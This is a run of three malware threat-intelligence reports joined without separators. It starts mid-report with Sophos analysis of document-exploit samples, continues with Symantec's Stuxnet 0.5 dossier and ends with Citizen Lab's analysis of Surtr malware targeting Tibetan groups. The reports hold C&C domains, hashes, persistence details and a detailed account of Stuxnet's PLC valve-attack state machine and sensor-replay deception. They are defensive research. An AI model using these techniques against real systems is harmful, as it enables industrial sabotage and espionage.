C & C servers adobeflashupdate.dynu.com Dynamic DNS service transactiona.com Domain Status : clientTransferProhibited Registrant Postal Code : 100191 Registry Registrant ID : Registrant Country : CN Registrant Name : qiuping liu Registrant Phone : + 86.1052810955 Registrant Organization : huajiyoutian Registrant Phone Ext : Registrant Street : beijing Registrant Fax : + 89.1052810955 Registrant City : Beijing Registrant Fax Ext : Registrant State / Province : BJ Registrant Email : yuminga1 @ 126.com systemupdate5.dtdns.com Dynamic DNS service 9bc128f120996677d3c4f7c1d7506315b232e49e Original name : План космической деятельности на 2015 - 2020 год.doc Dropped to % PROFILE % \Local Settings\Temp\3.tmp ; 64 bit malware components , refer to the same files names that are used by 0dfd883c1f205f0740d50688683f1869bcc0e9d7 C & C servers : N / A There were a few other samples , but all single .
Kamics : 712df1f1f11f63e2154eb9023d584be62ef100b8 Original name : N / A The dropped decoy document is a password protected Word file , content is not visible in the lack of the correct password .
System activity Dropped to % PROFILE % \Local Settings\Temp\msvcpdl100.dll ( SHA1 : 51346d70ea97a7aaef80f98c4891526443b2696c ) and C : \MsBuild\Microsoft\Windows\System32\ svchost.exe ( SHA1 : 2196770391bdbdd15bce5895427ec99b1bef0868 ) ; registered for startup in HKCU\Software\Microsoft\Windows\CurrentVersion\Run → Kaspersky Internet Security C & C servers buglaa.sportnewsa.net Farfli : 960ac7329a6e80682959d6da0469921f8167e79a Original name : MoFA Note- Verbale on 19.8.14.doc System activity Dropped to % PROFILE % \Application Data\winlog.exe ( SHA1 : 511f2055a56c0f458b1b14cc207730d0fe639df4 ) and % PROFILE % \Application Data\winlog.dll ( SHA1 : bb185efd35f7b4892a32e7853e044e94502a36af ) C & C servers unisers.com Domain Status : clientTransferProhibited Registrant State : Beijing Registry Registrant ID : Registrant Postal Code : 100001 Registrant Name : wang cheng Registrant Country : CN Registrant Organization : wang cheng Registrant Phone : + 86.01085452454 Registrant Street : BeijingDaguoROAD136 Registrant Fax : + 86.01085452454 Registrant City : Beijing Registrant Email : bitumberls .
@ 163.com But not all were failures .
There were two samples that followed the above structure , and the Goldsun shellcode offset was fixed .
However , both samples were only dropping and executing a Chinese nationalized version of calc .
exe – these are clearly test samples from China .
Furthermore , a couple of common malware samples were found with fixed second stage offsets , showing that at least these guys know what they are doing .
Still , they kept the inactive encrypted Zbot at the beginning of the document .
Among the samples conventional Zbots variants were also found .
These showed up in Middle Eastern countries , and have Arabic themes as a decoy .
a44308788bbd189e532745a79d126feaf708c3cd Original name : ‫ةغللا يف ةعونمو ةماه تاحلطصم‬.doc System activity Dropped to % PROFILE % \Application Data\Yhyq\sied.exe ( random directory and filename ) ; registered for startup in HKCU\Software\Microsoft\Windows\CurrentVersion\Run → Opagw C & C servers www.starorder.ezua.com Dynamic DNS service pop3.sec-homeland.com Domain Status : OK Registry Registrant ID : Registrant Country : China Registrant Name : dfhgewy Registrant Phone : + 086.0000 00000000 Registrant Organization : dfhgewy Registrant Phone Ext : Registrant Street : dfhgewy Registrant Fax : + 086.0000 00000000 Registrant City : Unknown City Registrant Fax Ext : Registrant State / Province : Unknown Province Registrant Email : joiupnhs @ 163.com Registrant Postal Code : 000000 d05e586251b3a965b9c9af76568eff912e16432f Original name : ‫كرابملا ىحضالا ديعب ةئنهت‬.doc System activity Dropped to % PROFILE % \Application Data\Hysyt\ydbi.exe ( random directory and filename ) ; registered for startup in HKCU\Software\Microsoft\Windows\CurrentVersion\Run → Pecyiqu C & C servers www.starorder.ezua.com Dynamic DNS service pop3.sec-homeland.com Domain Status : OK Registrant Postal Code : 000000 Registry Registrant ID : Registrant Country : China Registrant Name : dfhgewy Registrant Phone : + 086.0000 00000000 Registrant Organization : dfhgewy Registrant Phone Ext : Registrant Street : dfhgewy Registrant Fax : + 086.0000 00000000 Registrant City : Unknown City Registrant Fax Ext : Registrant State / Province : Unknown Province Registrant Email : joiupnhs @ 163.com Swrort : fa616b8e2f91810a8d036ba0adca6df50da2ad22 Original name : test.doc System activity Dropped to % PROFILE % \Local Settings\Temp\3.tmp C & C servers During the analysis of this campaign we ran into a handful of samples that have nothing to do with CVE-2014 - 1761 , but they contained some of the encrypted Zbot at the beginning of the file .
The end of encrypted PE is truncated , and the CVE-2012 - 0158 code is replaced with the Plugx shellcode .
Interestingly , there is another shellcode , which is starts with the same marker ( `` p ! 11 '' ) as the Goldsun second stage code , but the execution logic is the same as the Plugx shellcode .
However , this shellcode just hangs in the air , no execution path leads to it .
It is not clear , where these samples fit in the development path , could be that after the failure to integrate CVE-2014 - 1761 , the corresponding part was simply ditched from the samples .
6f845ef154a0b456afcf8b562a0387dabf4f5f85 Original name : Indian Cooking Recipe.doc The payload is next generation Plugx , plugin function creation dates are 0x20130524 .
Dropped to % PROFILE % \Application Data\Erease.vbe , that connects to the C & C server .
The dropped decoy document is bogus , a truncated copy of the exploited document .
Apart from the lesson learned about malware development , what can we learn from this process ? The partially successful Plugx attempt raises a few questions .
Should it be considered as a common cybercrime sample ( as the dropped Zbot suggests ) or as an APT ( as Plugx does ) ? Actually , it depends on the patch level of the targeted computer .
The narrow line between APT and common malware shrank to zero with that sample .
We have seen earlier6 that authors of common malware are getting the idea of document - based exploitation from the APT players .
Now it is swinging back – targeted attack players are snatching ideas from the other group .
The fact that the attempt was less successful does not deny the fact that a symbiosis exists between the two distinct criminal groups , and ideas are floating in both directions .
References : United Kingdom and Worldwide Sales North American Sales Australia and New Zealand Sales Asia Sales Tel : + 44 ( 0 ) 8447 671131 Toll Free : 1 - 866 - 866 - 2802 Tel : + 61 2 9409 9100 Tel : + 65 62244168 Email : sales @ sophos.com Email : nasales @ sophos.com Email : sales @ sophos.com.au Email : salesasia @ sophos.com Oxford , UK | Boston , USA © Copyright 2014 .
Sophos Ltd. All rights reserved .
Registered in England and Wales No .
2096520 , The Pentagon , Abingdon Science Park , Abingdon , OX14 3YP , UK Sophos is the registered trademark of Sophos Ltd. All other product and company names mentioned are trademarks or registered trademarks of their respective owners .
In 2010 , Symantec reported on a new and highly sophisticated worm called Stuxnet .
This worm became known as the first computer software threat that was used as a cyber - weapon .
The worm was specifically designed to take control over industrial plant machinery and making them operate outside of their safe or normal performance envelope , causing damage in the process .
This was a first in the history of malware .
Clues in the code pointed to other versions of the worm which could potentially perform different actions leaving an open question about Stuxnet and how it came to be .
The wait for the missing link is now over .
Symantec have now discovered an older version of Stuxnet that can answer the questions about the evolution of Stuxnet .
This newly discovered variant has been dissected and analyzed in detail and here is a summary of our key findings : • Stuxnet 0.5 is the oldest known Stuxnet version to be analyzed , in the wild as early as November 2007 and in development as early as November 2005 .
• Stuxnet 0.5 was less aggressive than Stuxnet versions 1.x and only spread through infected Step 7 projects .
• Stuxnet 0.5 contains an alternative attack strategy , closing valves within the uranium enrichment facility at Natanz , Iran , which would have caused serious damage to the centrifuges and uranium enrichment system as a whole .
Stuxnet 0.5 : The Missing Link Whether Stuxnet 0.5 was successful is unclear , but later versions of Stuxnet were developed using a different development framework , became more aggressive , and employed a different attack strategy that changed the speeds of the centrifuges instead instead suggesting Stuxnet 0.5 did not completely fulfill the attacker 's goals .
More versions of Stuxnet are known to exist , but have never been recovered .
Table 1 Stuxnet 0.5 was submitted to and generally are in the range of the year 2001 .
Table 2 Table 3 Based on an internal version number Stuxnet 0.5 is partly based on the Flamer platform whereas 1.x versions were based primarily on the Tilded platform .
Over time , the developers appear to have migrated more towards the Tilded platform .
The developers actually re - implemented Flamer - platform components using the Tilded platform in later versions .
Both the Flamer and Tilded platform code bases are different enough to suggest different developers were involved .
Stuxnet 0.5 also contains code to attack the valve systems in a uranium enrichment facility rather than modifying centrifuge speeds , as in versions 1.x of Stuxnet .
Stuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX files .
Using the Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability ( CVE- 2012 - 3015 ) , the S7hkimdb.dll file is executed , which then decrypts and injects the main XR00001.MDX Stuxnet binary file into the services.exe process .
Stuxnet is now executing on the system .
Once injected into the services.exe process , a copy of the main Stuxnet binary and a companion DLL that implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver .
The main Stuxnet binary refers to itself as outbreak.dll and is saved to disk as oem7a.pnf .
The companion DLL that implements the payload refers to itself as installation.dll and saved to disk as oem7w.pnf .
When the system is booted , the MRXCLS.SYS load point driver will decrypt configuration data stored in the registry , decrypt the main Stuxnet binary , and inject it into the Explorer and Step 7 processes .
The payload DLL will be decrypted as well and injected into the Explorer process .
When loading dynamic - link library ( DLL ) resources , Stuxnet makes use of a module that mimics LoadLibrary rather than calling LoadLibrary itself .
This technique is likely used to avoid security software and was not seen in versions 1.x of Stuxnet .
A second driver , PCIBUS.SYS , is also created which causes a forced reboot by generating a BSoD ( Blue Screen of Death ) 20 days after installation .
A third driver , USBACC11.SYS , is then installed .
This driver is similar to the MRXCLS.SYS driver , but instead decrypts and injects DLLs for peer - to - peer and C & C communication into the svchost.exe and Internet Explorer processes .
The structure and organization as well as resource and export listings of each component is available in Appendix D. Stuxnet 0.5 also checks the current date in a variety of code paths and will not continue to spread after July 4 , 2009 .
Certain modules may also not be created or loaded if security software is present .
A list is available in Appendix B .
A variety of additional files are created , including log files and configuration files .
A list is available in Appendix A. Stuxnet 0.5 uses one form of replication through Step 7 project archives .
When a removable drive is inserted in an infected system , Stuxnet 0.5 will infect any Step 7 project archives with a .s7p
or .zip
file name extension on the drive .
In addition , Step 7 project archives on the local disk will also be infected .
Therefore Stuxnet 0.5 spreads to additional machines through removable drives or through human - initiated sharing of infected Step 7 project archives , for example through email .
Stuxnet 0.5 infects Step 7 project archives in the same manner as Stuxnet 1.x versions ( as described in W32 .
Stuxnet Dossier , Step 7 Project File Infections ) .
The following is an example file listing of an infected Step 7 project file .
ApiLog / Types – modified to trigger DLL loading vulnerability XUTILS / links / S7P00001.DBF – configuration file XUTILS / listen / S7000001.MDX – payload DLL ( installation.dll ) XUTILS / listen / XR000000.MDX – main Stuxnet binary ( outbreak.dll ) hOmSave7/subfolder / s7hkimdb.dll - loader Similar to Stuxnet 1.x versions , Stuxnet 0.5 has limited command - and - control ability .
In particular , Stuxnet 0.5 does not provide fine grained control to its authors .
Instead , Stuxnet 0.5 can only download new code and update itself .
Stuxnet needs to ultimately spread on isolated networks with no Internet access , therefore it has been designed to be autonomous to reduce the need for robust and fine grained command - and - control .
Stuxnet 0.5 also uses a secondary peer - to - peer mechanism to propagate these code updates to peers on networks inaccessible to the broader Internet .
Command - and - control is implemented by the inetpsp.dll file while peer - to - peer communications are implemented by the netsimp32.dll file .
Both files are loaded by the usbacc11.sys driver and then injected into the svchost.exe and iexplore.exe processes .
Stuxnet 0.5 has four C & C servers , all of which are now either unavailable or have since been registered by an unrelated party : • smartclick.org • best-advertising.net • internetadvertising4u.com • ad-marketing.net Interestingly , Stuxnet 0.5 is programmed to stop contacting the C & C server after January 11 , 2009 , even though the threat is programmed to only stop spreading after a later date of July 4 , 2009 .
Figure 1 The C & C server domains were created in 2005 and all displayed Internet advertising agency homepage for Stuxnet C & C servers the same front page purporting to be an Internet advertising agency named Media Suffix ( figure 1 ) with the tag line `` Believe What the Mind Can Dream '' .
The servers were hosted on commercial hosting providers in the United States , Canada , France , and Thailand .
The fact that these domains were in operation since 2005 , suggests that the Stuxnet project started more than seven years ago .
The first request by Stuxnet 0.5 uses the following form : This notifies the C & C server of an active successful infection .
Next , Stuxnet 0.5 sends the following request : This may download and execute a file if an update is available .
The final target network for Stuxnet 0.5 was likely isolated from the Internet .
To allow updates to reach these machines , Stuxnet 0.5 also used a peer - to - peer mechanism .
As long as one updated version was introduced into this network - for example through an infected USB key - all the other infected machines on the network could receive updates or new code modules .
Stuxnet 0.5 uses Windows mailslots for peer - to - peer communication .
Mailslots allow a process to pass a message to another process on a remote machine .
Stuxnet 0.5 enumerates all machines on the network and attempts to connect to a mailslot named \\ [ REMOTE MACHINE NAME ] \mailslot\svchost .
It then provides a callback mailslot name of \\ [ LOCAL MACHINE NAME ] \mailslot\imnotify .
Stuxnet 0.5 uses these mailslots for peer - to - peer communication and to pass code updates .
In addition , Stuxnet 0.5 may configure systems to allow anonymous logins and then provides the following file shares : This allows file retrieval by peer infections .
Shared files include : Man - in - the - Middle In order to both fingerprint the target system and inject malicious Programmable Logic Controller ( PLC ) code , Stuxnet 0.5 replaces two Step 7 DLLs in order to hijack communications with a PLC .
The first DLL , s7otbxdx.dll , is hijacked in order to insert the malicious PLC code .
The same technique was used in Stuxnet versions 1.x ( as described in W32.Stuxnet Dossier , Modifying PLCs ) .
Stuxnet 0.5 hooks fewer exports and verifies the CPU is a 417 PLC rather than a 315 PLC , otherwise the behavior remains generally the same .
The second DLL , s7aaapix.dll , is used for fingerprinting the target system and building DB8061 , a PLC data block needed to conduct the attack .
The export AUTDoVerb is hijacked and the malicious s7otbxdx.dll file can call the export with magic values ( 0x91E55A3D , 0x996AB716 , 0x4A5CBB03 ) in order to build or provide a previously built DB8061 data block for injection .
Stuxnet hijacks AUTDoVerb in order to monitor any `` DOWNLOAD '' verb actions , which signifies the fingerprinting and building of DB8061 must occur again in order to ensure the target system is still correctly configured .
Fingerprinting and building DB8061 Table 4 iceNumber > A valve in module A21 , also in cascade 8 , and associated with centrifuge 160 , would have the symbol label PV- A21 - 8 - 160 , for example .
Each field is defined as follows : Delimiter Either space ( `` `` ) , hyphen ( `` - '' ) , underscore ( `` _ '' ) , or not present at all .
FunctionIdentifer A string that matches a set of strings ( available in Appendix C ) that loosely follows the ANSI / ISA S5.1 Instrumentation Symbols and Identification standard .
If the string is `` PIA '' ( Pressure Indicator Alarm ) , it is expected to be followed by a one digit number .
These strings will represent the device type ( a valve , a transducer , or a status light , for instance ) .
CascadeModule Must be the string `` A21 '' to `` A28 '' inclusive .
These strings match cascade modules in Natanz , Iran , seen publicly described as `` A24 '' , `` A26 '' , and `` A28 '' .
CascadeNumber Single character that is in the letter range A to R. If it is not in this letter range , it checks to see if it is two digits in the decimal range 00 to 18 .
This two digit number is the number representation of the letter for A to R. DeviceNumber This is parsed in a more complex fashion depending on the device type as determined by the function identifier and caters to three possible cascade arrangements .
The device type mappings to function identifiers are available in Appendix C. Device type 0 A string of digits : If the length of the digits is less than three , the device type is changed to device type 6 .
If the length of the digits is greater than or equal to three , the device type is changed to device type 7 .
Device type 1 , 2 , 3 `` # # '' : A two digit number in the range 1 to 25 .
Device type 4 , 5 , or 7 Device type 4 , 5 , or 7 has three different formats : Format 1 `` # # # # '' : Decoded as two separate two - digit numbers representing the stage number and the centrifuge number within the stage , respectively .
The stage number must be in the decimal range 1 to 15 , which matches with the known Natanz configuration .
For each of these 15 stages , the maximum number of expected centrifuges in each corresponding stage is looked up in the following array .
Table 5 This means , for example , stage 3 is expected to have a second two digit number equal to 4 or less .
This requirement is consistent with the centrifuge arrangement within a cascade .
Format 2 `` # # # '' : A three digit number that must be less than 164 , which is the number of centrifuges in a cascade .
Format 3 `` # # L '' : A two digit number followed by a letter .
The letter must be in the range A to D , and the number must be in the decimal range 1 to 43 .
This arrangement sub - divides each stage into sub - clusters of four .
Device type 6 `` # # '' : A two digit number in the range 1 to 30 .
Device type 8 , 9 , B , or C `` # # '' : A two digit number in the range 1 to 3 .
Device type A `` # # < delimiter > < string > '' : A two digit number in the range 1 to 3 with an optional string preceded by a delimiter character .
The string must start with the letter S and contain the letter P. If the string is present , the device is modified to be device type 0xB instead ( Flow Rate Transmitter Controller Output , rather than device type 0xA which is Flow Rate Transmitter Controller Input ) .
Based on the symbol fingerprinting , the following table summarizes what devices and labels Stuxnet looks for within the symbol table .
Table 6 Symbol address parsing Each symbol label will have two corresponding addresses : -- the address in the process image area and the direct peripheral address of the device represented by the symbol .
Modifying the memory at these addresses allows the PLC to control and read the behavior of the associated device .
For example , the value may be a Boolean value turning a switch on or off , or a 16-bit value representing the current temperature of the system .
Addresses can be either outputs ( the PLC sets the value to modify the behavior of the device ) or inputs ( the PLC reads the value to determine the current state of the device ) .
Device types 0 , 1 , 5 , and B must be output addresses and device types 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , A , and C must be input addresses .
Values at addresses for device types 0 , 1 , 2 , 3 , 4 , and 5 must be bit values .
Values at addresses for device types 6 , 7 , 8 , 9 , A , B , and C must be 16-bit values .
Cascade rating and building DB8061 After parsing the symbols and addresses for each cascade , the code inspects the configuration of each cascade .
Depending on the configuration , a rating is calculated .
Certain devices in certain configurations will result in higher ratings .
When complete , only the six highest - rated cascades have data written to DB8061 .
Finally , a flag is set signifying DB8061 has been built .
This flag is reset to 0 every time the `` DOWNLOAD '' verb is executed .
The code conducts an attack by closing valves in the six top rated cascades out of the possible 18 cascades .
The states of two types of valves are modified : • Centrifuge valves – a set of three valves ( feed , product , tails ) that work in unison per centrifuge to control uranium hexafluoride ( UF6 ) flow into each centrifugeStage valves – one per stage to control UF6 flow into each stage • Auxiliary valves – valves that control UF6 flow into or out of each stage ( stage valve ) or the cascade as a whole Figure 2 Similar to version 1.x of Stuxnet , the PLC device attack code consists of a state machine with eight possible states : State 0 ( Wait ) : Perform system identification and wait for the enrichment process to reach steady state before attack .
This can take approximately 30 days .
State 1 ( Record ) : Take peripheral snapshots and build fake input blocks for replaying later .
State 2 ( Attack centrifuge valves ) : Begin replaying fake input signals .
Close valves on most centrifuges .
State 3 ( Secondary pressure reading ) : Open both centrifuge and feed stage valves in the final stage of a single cascade to obtain a low pressure reading .
State 4 ( Wait for pressure change ) : Wait for desired pressure change or time limit .
This can take up to approximately two hours .
State 5 ( Attack auxiliary valves ) : Open all auxiliary valves except valves believed to be near the first feed stage ( stage 10 ) .
Wait for three minutes in this state .
State 6 ( Wait for attack completion ) : Wait for six minutes while preventing any state changes .
State 7 ( Finish ) : Reset and return to state zero .
Figure 3 State 0 : The code verifies the system has reached steady state by monitoring the state of each auxiliary valve and the amount of elapsed time .
• The valves must not change state for a period of 300 snapshots .
In addition , the code determines if most of the centrifuge valves are in the open or closed position .
• All cascades must be operational for three or more days , or currently be in the down state .
• At least one cascade must have been operating for more than 35 days , or collectively all cascades must have been operating for more than 297 days .
• Between 3 and 7 of the first 21 auxiliary valves must have been opened in the last 2 days .
• Most of the pressure readings associated with the auxiliary valves must be within an expected range .
Only if these all conditions are met does the code proceed to state 1 .
State 1 : There are 21 snapshots of the peripheral I / O values that are taken one second apart .
These values are stored for replay during the attack .
This prevents systems and technicians from realizing the system is no longer operating as expected .
State 2 : First , the normal operating pressure is obtained and stored for replay later .
For each stage a portion of all the centrifuge valves are closed , except in the feed stage ( stage 10 ) .
The centrifuge valves in the feed stage remain completely open , while the centrifuge valves at both the product end and tails end are completely closed .
The particular centrifuge valves closed per stage are randomly chosen .
The code will randomly chose a starting centrifuge valve and then close the next one in order until the last centrifuge valve in the stage .
If the total desired number of valves to close for that stage has not been reached , the code will continue from the first centrifuge valve in the stage until the maximum valves to close are reached .
Table 7 State 3 : In state 3 , in a single cascade , both centrifuge valves in stage 1 are opened and it is likely the stage valve of stage 1 is also opened .
Then , the code obtains a pressure reading at stage 1 .
The pressure should be relatively low .
This value is used for replay in later stages .
If the normal pressure operating pressure was n't obtained properly in state 2 , state 3 is actually skipped and hardcoded default values are used instead .
State 4 : State 4 waits for the desired pressure change or other predetermined time limits before proceeding to state 5 .
If any of the following conditions are met , the code will continue to state 5 : • The pressure of the stage 10 or stage 11 transducer ( these are likely transducers for or near the feed stage ) has an absolute value greater than 280 units above the expected value and greater than five times the expected value .
• 46 minutes after the state of an auxiliary valve has been modified from the original state recorded in state 1 , with the exception of auxiliary valve number 17 which is likely a stage valve near the product end .
• 2 hours and 3 minutes after the attack started ( since state 2 ) without any centrifuge valve state changes .
• 2 hours and 3 minutes since at least four centrifuge valve states have been modified from the original state recorded in state 1 .
State 5 : In state 5 , all the auxiliary valves are opened except valve numbers 17 , 18 , and 20 .
Before continuing to state 6 , the code waits for at least 2 minutes and 53 seconds .
State 6 : During state 6 , fake values continue to be replayed and any attempts to change device values are prevented for 6 minutes and 58 seconds .
State 7 : Data is reset and the code returns to state 0 .
By closing all valves except the initial feed stage valves , UF6 will continue to flow into the system .
This act alone may cause damage to the centrifuges themselves .
However , the attack expects the pressure to reach five times the normal operating pressure .
At this pressure , significant damage to the uranium enrichment system could occur and the UF6 gas could even revert to a solid .
Whether the attack succeeded in this manner or not remains unclear .
Even if the attack did succeed , the attackers decided to move to a different strategy in the Stuxnet 1.x versions , attacking the speed of the centrifuges instead .
Stuxnet 0.5 clarifies the evolution and history of Stuxnet .
Stuxnet clearly became more aggressive over time and switched development platforms as it evolved from 0.5 versions to later 1.x versions .
Key parts of the 417 attack code missing from versions 1.x is fully implemented in Stuxnet 0.5 .
This demonstrates that the 417 attack code was the first attack strategy implemented by Stuxnet .
This original 417 attack code attempted to modify valve states during the uranium enrichment process at Natanz , Iran , to cause damage to the centrifuges and the system as a whole .
Figure 4 The success of Stuxnet 0.5 remains Low - enriched uranium production ( source ISIS ) unknown .
However , the chart in figure 4 references uranium enrichment production at Natanz to key milestones of Stuxnet development .
Interesting events are dips in feed or production amounts and lower levels of production given the same or greater feed amounts ( shown as gaps between the two lines ) .
While the discovery of Stuxnet 0.5 helps to deepen our overall understanding of Stuxnet and what its goals are , versions remain unrecovered .
If these are located , they may expose other secrets behind this operation and more clues to its origins , but obtaining these other samples may prove to be next to impossible .
Table of each allowed function identifier , the corresponding device type , and the assumed device name .
Table 8 Organization of Stuxnet 0.5 components and behavior of each export .
Figure 5 Table 9 W32.Duqu http : //www.symantec.com / security_response / writeup.jsp ? docid=2011 - 101814 - 1119 - 99 W32.Flamer http : //www.symantec.com / security_response / writeup.jsp ? docid=2012 - 052811 - 0308 - 99 W32.Stuxnet http : //www.symantec.com / security_response / writeup.jsp ? docid=2010 - 071400 - 3123 - 99 Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability ( CVE-2012 - 3015 ) http : //www.securityfocus.com / bid/54651 Stuxnet 0.5 : The Missing Link http : //www.symantec.com / connect / blogs / stuxnet-05-missing - link Stuxnet 0.5 : Disrupting Uranium Processing At Natanz http : //www.symantec.com / connect / blogs / stuxnet-05-disrupting - uranium - processing - natanz Stuxnet 0.5 : How it Evolved http : //www.symantec.com / connect / blogs / stuxnet-05-how - it - evolved Stuxnet 0.5 : Command - and - Control Capabilities http : //www.symantec.com / connect / blogs / stuxnet-05-command - and - control - capabilities Symantec would like to thank the Institute for Science and International Security ( ISIS ) for their continued assistance in understanding centrifugal uranium enrichment systems .
About Symantec Symantec protects the world 's information , and is a global leader in security , backup and availability solutions .
Our innovative products and services protect people and information in any environment – from the smallest mobile device , to the enterprise data center , to cloud- based systems .
Our world - renowned expertise in protecting data , identities and interactions About the authors gives our customers confidence in a connected Geoff McDonald - Threat Analysis Engineer world .
More information is available at Liam O Murchu - Development Manager Stephen Doherty - Sr Threat Intelligence Analyst www.symantec.com or by connecting with Eric Chien - Distinguished Engineer Symantec at : go.symantec.com/socialmedia .
For specific country offices and contact num- Symantec Corporation Copyright © 2013 Symantec Corporation .
All rights reserved .
Symantec and the Symantec logo are trademarks or registered bers , please visit our Web site .
For product World Headquarters trademarks of Symantec Corporation or its affiliates in the information in the U.S. , call 350 Ellis Street U.S. and other countries .
Other names may be trademarks of their respective owners .
toll - free 1 ( 800 ) 745 6054 .
Mountain View , CA 94043 USA + 1 ( 650 ) 527 - 8000 www.symantec.com Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation .
NO WARRANTY .
The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use .
Any use of the technical documentation or the information contained herein is at the risk of the user .
Documentation may include technical or other inaccuracies or typographical errors .
Symantec reserves the right to make changes without prior notice .
August 2 , 2013 Tagged : Malware , targeted threats , Tibet Categories : Reports and Briefings , Research News by Katie Kleemola and Seth Hardy As part of our ongoing study into targeted attacks on human rights groups and civil society organizations , the Citizen Lab analyzed a malicious email sent to Tibetan organizations in June 2013 .
The email in question purported to be from a prominent member of the Tibetan community and repurposed content from a community mailing list .
Attached to the email were what appeared to be three Microsoft Word documents ( .doc
) , but which were trojaned with a malware family we call `` Surtr '' .
All three attachments drop the exact same malware .
We have seen the Surtr malware family used in attacks on Tibetan groups dating back to November 2012 .
While the malicious attachments appear to be DOC files due to their file extension , they are actually RTFs crafted to exploit a vulnerability in Microsoft Word : CVE-2012 - 0158 .
This particular vulnerability was first exploited in early April 2012 and a patch was released by Microsoft on April 10 , 2012 .
Currently , the sample is detected as malicious by 34 percent of antivirus ( AV ) engines on VirusTotal ( VT ) .
The malicious attachment is created using a shared template that we have seen used against multiple Tibetan groups .
This template was created in March 2013 and , instead of specifically using the vulnerable ActiveX controls described in the vulnerability description , it utilizes the Chartspace Office Web Component .
This component either suffers from the same vulnerability or uses one of the named ActiveX controls resulting in the attacker being able to execute malicious code .
Figure 1 : Hexdump of the malicious attachment Although CVE-2012 - 0158 was first published and used in the wild in April 2012 , samples using this template were only initially detected by three AV engines ( on VT ) .
Therefore , while a third of AV engines had a detection signature for CVE-2012 - 0158 as late as April 2013 , it was possible to design a document using a year old vulnerability that was recognized as malicious by very few AV products .
This number has since risen and it is currently being detected by 34 percent of the AV products listed on VT .
This vulnerability highlights the need to keep both operating systems and applications up to date as well as to exercise vigilance concerning links and email attachments .
Malicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory .
Surtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread function .
It also creates the following folders : % ALL USERS % /Application Data / Microsoft / Windows/123 % ALL USERS % /Application Data / Microsoft / Windows / Burn % ALL USERS % /Application Data / Microsoft / Windows / LiveUpdata_Mem It creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders .
The copy in the Burn folder is called [ VICTIM COMPUTER NAME ] .dll
and there are three copies in the LiveUpdata_Mem folder whose names consist of 6 random alphanumeric characters which are then appended with .dll
, _ Fra.dll and _ One.dll .
These copies will differ from the original payload dropped in the % TEMP % folder by filling the resource section with varying amounts of 00 bytes .
This also results in the malware having a much larger file size ( 30 - 50 mb ) possibly in an attempt to evade antivirus heuristics .
Surtr connects to a command and control server ( C2 ) and downloads a stage two component to % ALL USERS % /Application Data / Microsoft / Windows / Burn/ _ [ VICTIM COMPUTER NAME ] .log
.
This particular sample connects to internet.3-a.net on port 9696 .
In May 2012 , internet.3-a.net resolved to the same IP ( 184.82.123.143 ) as android.uyghur.dnsd.me , which is a C2 used in Android malware attacks that targeted the Tibetan community as previously documented by the Citizen Lab .
The stage two component that was downloaded in this particular case has an internal name of x86_GmRemote.dll , however we have seen an alternate stage two used with the name Remote.dll as well .
Our analysis in this post focuses on the GmRemote variation as it has been seen in multiple attacks .
Surtr 's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine , viewing web cache , executing remote commands and logging keystrokes .
In order to store temporary information , Surtr creates the following folders : % ALL USERS % /Application Data / Microsoft / Windows / MpCache % ALL USERS % /Application Data / Microsoft / Windows / nView_DiskLoydb % ALL USERS % /Application Data / Microsoft / Windows / nView_KeyLoydb % ALL USERS % /Application Data / Microsoft / Windows / nView_skins % ALL USERS % /Application Data / Microsoft / Windows / UsbLoydb For example , in nView_DiskLoydb , a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output .
The keylogger output is disguised by adding a constant to the ordinal value of the character .
This data can then be sent to the C2 .
It is compressed using zlib DEFLATE so the network traffic is not human readable without decompression .
It can also download additional malware onto the victim computer , which can provide attackers with further abilities like accessing the victim computer 's webcam or microphone .
In particular , we have seen Surtr used in conjunction with the Gh0st RAT derived LURK0 malware .
For persistency , Surtr adds a key to the registry to ensure it runs when the infected computer is restarted .
It also stores its C2 information and a campaign code in the registry .
Depending on the configuration , Surtr will either create multiple registry keys in Software\Microsoft\Windows Media in HKU ( hkey users ) with text data or a single key called XC consisting of binary data .
These are usually xor encrypted with a key of 0×1 .
Figure 2 : Encrypted data in XC key Figure 3 : Decrypted data ( note : e0 25 is 0x25e0 which is 9696 in hex ) We have seen a large number of similar samples sent to Tibetan groups that use the same stage two ( GmRemote ) and communicate with the following C2s : dtl.dnsd.me , dtl.eatuo.com , dtl6.mooo.com and tbwm.wlyf.org .
These C2s were also used in previous attacks documented in an earlier Citizen Lab post on LURK0 malware targeting the Tibetan community .
One particular sample ( md5 : ad9e5f79585eb62bc40b737e98bfd62e ) which connects to C2 domain dtl6.mooo.com ( which resolved to the same IP as the other dtl domains mentioned above ) on port 6178 was seen to download LURK0 malware after the initial Surtr infection .
This LURK0 sample had the campaign code ZQ6 that connects to C2 domain tbwm.wlyf.org on port 3103 .
This domain also resolved to the same IP as the dtl domains .
We have also found reports of other Surtr stage 2 ( GmRemote ) samples that have campaign codes which suggest they may be targeted at commercial and government targets .
The first sample was found via ThreatExpert .
It uses campaign code kmlg-0308 , and connects to a C2 at flyoutside.com .
This domain and eight others are registered to toucan6712 @ 163.com : Searching for more samples in Virus Total Intelligence ( VTI ) using domains and other identifying features reveals four related files : 7fbdd7cb8b46291e944fcecd5f97d135 – connects to C2 domain www.flyoutside.com , campaign code kmlg-0409 tb 58ff38412ebbedb611a3afe4b3dbd8b0 – connects to C2 IP 112.121.182.149 ( similar to above ) , campaign code lly-0311 81bc8974967e1c911b107a9a91e3178b – connects to C2 domain www.paulfrank166.2waky.com ( 192.198.85.102 ) , campaign code 0201- 2116 44758b9a7a6cafd1b8d1bd4c773a2577 – connects to C2 domain www.flyoutside.com ( same as the first sample found on ThreatExpert ) , campaign code lg-0109 Most of these samples have campaign codes that suggest commercial targets .
However , we do not have information about where these samples were submitted from , so the target sector and victims can not be confirmed .
A second GmRemote sample was found via the web , called Trojan / Subxe.89E1 by Anchiva .
